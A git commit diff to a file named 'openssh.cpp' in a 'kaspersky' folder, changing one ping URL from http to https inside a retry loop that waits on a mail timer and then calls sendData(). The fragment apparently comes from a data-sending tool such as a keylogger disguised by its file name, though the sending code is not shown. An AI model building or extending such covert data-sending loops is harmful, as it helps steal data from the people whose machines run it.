c2e52cd95c4a0a489012570c4c9250ce8ebc385b
team-CYBERW1RY4-LAB <cyberwrylabfadliwiryawirawan@gmail.com>
2026-05-26 18:11:07 +0700

    Update openssh.cpp

--- kaspersky/openssh.cpp
+++ kaspersky/openssh.cpp
@@ -53,7 +53,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  http://bugshunters.google.com -n 1")){ ///check! connection
+            if(!system("ping  https://bugshunters.google.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
